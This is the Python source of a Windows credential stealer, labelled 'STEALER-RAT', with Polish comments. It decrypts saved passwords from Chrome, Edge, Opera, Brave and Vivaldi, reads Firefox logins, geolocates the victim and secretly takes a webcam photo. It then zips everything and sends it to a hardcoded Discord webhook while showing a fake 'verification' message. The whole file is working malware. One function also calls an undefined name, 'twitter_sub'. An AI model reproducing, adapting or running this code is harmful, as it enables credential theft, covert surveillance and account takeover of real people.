import os
import json
import base64
import sqlite3
import shutil
import tempfile
import win32crypt
import cv2
import numpy as np
import io
import requests
import zipfile
import re
import time
import platform
import socket
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ============ KONFIGURACJA ============
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1530924158752391178/7N7MX0c-Ps6QgPI5VhDKtuq_HWnLDUFF0HlDdynDYtGPoG3wBYsYZCEHWBKpf8OnIGtI"  # ← ZMIEŃ!
# =====================================

def get_ip_info():
    """Pobiera IP, lokalizację, urządzenie"""
    try:
        ip_response = requests.get("https://api.ipify.org?format=json", timeout=5)
        ip = ip_response.json().get("ip", "Unknown")
        
        # Lokalizacja po IP
        loc_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        loc_data = loc_response.json()
        
        location = f"{loc_data.get('city', '?')}, {loc_data.get('regionName', '?')}, {loc_data.get('country', '?')}"
        
        device = f"{platform.node()} | {platform.system()} {platform.release()} | {platform.machine()}"
        
        return {
            'ip': ip,
            'location': location,
            'device': device
        }
    except:
        return {
            'ip': 'Unknown',
            'location': 'Unknown',
            'device': platform.node() or 'Unknown'
        }

def decrypt_chrome_password(encrypted_value, key):
    try:
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:]
        cipher = AESGCM(key)
        return cipher.decrypt(iv, payload, None).decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        except:
            return ""

def get_browser_key(profile_path):
    local_state_path = os.path.join(profile_path, "Local State")
    if os.path.exists(local_state_path):
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]
                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except:
            pass
    return None

def extract_all_passwords():
    """Extractuje WSZYSTKIE hasła z WSZYSTKICH przeglądarek"""
    all_passwords = []
    
    browsers_config = {
        'Chrome': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
        'Edge': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
        'Opera': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable"),
        'Brave': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
        'Vivaldi': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"),
    }
    
    for browser, base_path in browsers_config.items():
        if os.path.exists(base_path):
            key = get_browser_key(base_path)
            if not key:
                continue
            
            profiles = [d for d in os.listdir(base_path) if d.startswith(('Default', 'Profile'))]
            if not profiles:
                profiles = ['Default']
            
            for profile in profiles:
                db_path = os.path.join(base_path, profile, "Login Data")
                if not os.path.exists(db_path):
                    continue
                
                temp_db = tempfile.mktemp()
                try:
                    shutil.copyfile(db_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for url, username, encrypted_pass in cursor.fetchall():
                        if username and encrypted_pass:
                            password = decrypt_chrome_password(encrypted_pass, key)
                            if len(password) > 3:
                                service = re.sub(r'https?://(www\.)?', '', url).split('/')[0]
                                service = re.sub(r'\..*', '', service)  # Clean domain
                                all_passwords.append({
                                    'service': service.upper(),
                                    'url': url,
                                    'email': username,
                                    'password': password
                                })
                    conn.close()
                except:
                    pass
                finally:
                    try:
                        os.unlink(temp_db)
                    except:
                        pass
    
    # Firefox
    firefox_base = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_base):
        for profile in os.listdir(firefox_base):
            logins_path = os.path.join(firefox_base, profile, "logins.json")
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        for login in data.get('logins', []):
                            hostname = login.get('hostname', '')
                            service = re.sub(r'https?://(www\.)?', '', hostname).split('/')[0]
                            service = re.sub(r'\..*', '', service)
                            all_passwords.append({
                                'service': service.upper(),
                                'url': hostname,
                                'email': login.get('username', ''),
                                'password': login.get('password', '')
                            })
                except:
                    pass
    
    return all_passwords

def find_social_links(passwords):
    """Znajduje linki do profili social media"""
    social_platforms = {
        'youtube': None,
        'tiktok': None,
        'instagram': None,
        'facebook': None,
        'twitter': None,
        'twitch': None,
        'snapchat': None,
        'pinterest': None,
        'reddit': None,
        'linkedin': None
    }
    
    for pw in passwords:
        url_lower = pw['url'].lower()
        for platform in social_platforms:
            if platform in url_lower and not social_platforms[platform]:
                # Build profile URL
                if 'youtube' in url_lower:
                    social_platforms['youtube'] = f"https://www.youtube.com/@{pw['email'].split('@')[0] if '@' in pw['email'] else pw['email']}"
                elif 'tiktok' in url_lower:
                    social_platforms['tiktok'] = f"https://www.tiktok.com/@{pw['email'].split('@')[0] if '@' in pw['email'] else pw['email']}"
                elif 'instagram' in url_lower:
                    social_platforms['instagram'] = f"https://www.instagram.com/{pw['email'].split('@')[0] if '@' in pw['email'] else pw['email']}"
                elif 'facebook' in url_lower:
                    social_platforms['facebook'] = f"https://www.facebook.com/{pw['email'].split('@')[0] if '@' in pw['email'] else pw['email']}"
                elif twitter_sub in url_lower:
                    social_platforms['twitter'] = f"https://twitter.com/{pw['email'].split('@')[0] if '@' in pw['email'] else pw['email']}"
                elif 'twitch' in url_lower:
                    social_platforms['twitch'] = f"https://www.twitch.tv/{pw['email'].split('@')[0] if '@' in pw['email'] else pw['email']}"
    
    # Filter out None values
    return {k: v for k, v in social_platforms.items() if v}

def format_password_file(passwords):
    """Tworzy ładnie sformatowany password.txt"""
    
    # Priorytetowe platformy (kolejność)
    priority = ['STEAM', 'GOOGLE', 'ROBLOX', 'DISCORD', 'YOUTUBE', 'TIKTOK', 
                'INSTAGRAM', 'FACEBOOK', 'TWITTER', 'NETFLIX', 'SPOTIFY',
                'AMAZON', 'PAYPAL', 'ALLEGRO', 'OLX', 'SNAPCHAT', 'TWITCH',
                'REDDIT', 'LINKEDIN', 'PINTEREST', 'EPICGAMES', 'FORTNITE',
                'BATTLE', 'ORIGIN', 'UBISOFT', 'MICROSOFT', 'APPLE', 'SAMSUNG']
    
    sorted_passwords = []
    used = set()
    
    # Najpierw priorytetowe
    for p in priority:
        for pw in passwords:
            if p in pw['service'].upper() and pw['email'] not in used:
                sorted_passwords.append(pw)
                used.add(pw['email'])
    
    # Potem reszta
    for pw in passwords:
        if pw['email'] not in used:
            sorted_passwords.append(pw)
            used.add(pw['email'])
    
    content = ""
    content += "=" * 50 + "\n"
    content += "     🎯 STEALER-RAT CREDENTIAL DUMP 🎯\n"
    content += "=" * 50 + "\n\n"
    content += f"Victim: {os.getenv('USERNAME')} | PC: {os.getenv('COMPUTERNAME')}\n"
    content += f"Total Accounts: {len(sorted_passwords)}\n"
    content += f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    content += "=" * 50 + "\n\n"
    
    for pw in sorted_passwords:
        content += "―" * 30 + "\n"
        content += f"{pw['service']}:\n"
        content += f"Password: {pw['password']}\n"
        content += f"e-mail: {pw['email']}\n"
        content += "―" * 30 + "\n"
        content += f"URL: {pw['url']}\n\n"
    
    content += "=" * 50 + "\n"
    content += f"Total: {len(sorted_passwords)} accounts stolen\n"
    content += "=" * 50 + "\n"
    
    return content

def take_webcam_photo():
    """Robi zdjęcie z kamery"""
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return None
        
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        
        ret, frame = cap.read()
        cap.release()
        cv2.destroyAllWindows()
        
        if ret:
            _, img_encoded = cv2.imencode('.png', frame)
            return base64.b64encode(img_encoded).decode()
        else:
            return None
    except:
        return None

def main():
    # ====== CICHY START ======
    print("Starting verification...")  # Tylko to widzi użytkownik
    
    # ====== ZBIERANIE DANYCH ======
    passwords = extract_all_passwords()
    ip_info = get_ip_info()
    social_links = find_social_links(passwords)
    webcam_b64 = take_webcam_photo()
    
    # ====== TWORZENIE password.txt ======
    password_content = format_password_file(passwords)
    
    # ====== TWORZENIE ZIP ======
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Dodaj password.txt
        zf.writestr('password.txt', password_content.encode('utf-8'))
        
        # Dodaj camera.png (jeśli jest)
        if webcam_b64:
            try:
                img_data = base64.b64decode(webcam_b64)
                zf.writestr('camera.png', img_data)
            except:
                pass
    
    zip_buffer.seek(0)
    
    # ====== BUDOWANIE WIADOMOŚCI NA DISCORD ======
    
    # Embed z informacjami
    embed = {
        'title': '🎯 **STEALER-RAT TRIGGERED** 🎯',
        'description': f'```{os.getenv("USERNAME")}``` opened the file!',
        'color': 16711680,  # Czerwony
        'fields': [
            {
                'name': '🌐 IP',
                'value': f'```{ip_info["ip"]}```',
                'inline': True
            },
            {
                'name': '📍 Location',
                'value': f'```{ip_info["location"]}```',
                'inline': True
            },
            {
                'name': '💻 Device',
                'value': f'```{ip_info["device"]}```',
                'inline': False
            },
            {
                'name': '🔑 Accounts Stolen',
                'value': f'```{len(passwords)} credentials```',
                'inline': True
            },
            {
                'name': '📸 Webcam',
                'value': '```✅ Captured```' if webcam_b64 else '```❌ No camera```',
                'inline': True
            }
        ]
    }
    
    # Dodaj linki social media
    social_text = ""
    if social_links:
        for platform, link in social_links.items():
            social_text += f"🔗 **{platform.title()}**: {link}\n"
        embed['fields'].append({
            'name': '📱 Social Media Profiles',
            'value': social_text or '```None found```',
            'inline': False
        })
    
    # Dodaj podsumowanie kont
    service_count = {}
    for pw in passwords:
        s = pw['service']
        service_count[s] = service_count.get(s, 0) + 1
    
    top_services = sorted(service_count.items(), key=lambda x: x[1], reverse=True)[:10]
    top_text = ""
    for service, count in top_services:
        top_text += f"▸ **{service}**: {count} accounts\n"
    
    embed['fields'].append({
        'name': '🏆 Top Services',
        'value': top_text or '```No data```',
        'inline': False
    })
    
    # ====== WYSYŁANIE ======
    try:
        files = {
            'file': ('stealer-rat.zip', zip_buffer.getvalue(), 'application/zip')
        }
        
        response = requests.post(
            DISCORD_WEBHOOK,
            data={'embeds': [json.dumps(embed)]},
            files=files,
            timeout=30
        )
        
        if response.status_code == 204:
            pass  # Sukces
        elif response.status_code == 200:
            pass  # Sukces
        else:
            # Próba wysłania bez embed
            requests.post(
                DISCORD_WEBHOOK,
                files=files,
                timeout=30
            )
    except:
        # Silent fail - ofiara nie widzi błędu
        pass
    
    # ====== KONIEC - ofiara nie widzi errors ======
    print("Verification complete. Thank you.")

if __name__ == "__main__":
    main()